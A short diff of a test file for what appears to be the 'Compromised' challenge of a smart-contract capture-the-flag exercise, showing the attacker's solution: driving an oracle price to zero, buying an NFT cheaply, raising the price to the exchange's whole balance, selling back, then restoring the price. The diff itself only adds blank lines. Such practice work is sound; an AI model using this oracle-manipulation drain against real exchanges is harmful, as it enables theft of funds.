@@ -99,12 +99,14 @@ describe('Compromised challenge', function () {
 
     await postPrice(0)
     await this.exchange.connect(attacker).buyOne({ value: 2 })
+
     const tokenId = 0 // would get it from the event logs, not in return value, I know it from the code because it is first one minted
     await postPrice(EXCHANGE_INITIAL_ETH_BALANCE)
     await this.nftToken
       .connect(attacker)
       .approve(this.exchange.address, tokenId)
     await this.exchange.connect(attacker).sellOne(tokenId)
+
     await postPrice(INITIAL_NFT_PRICE)
   })
 
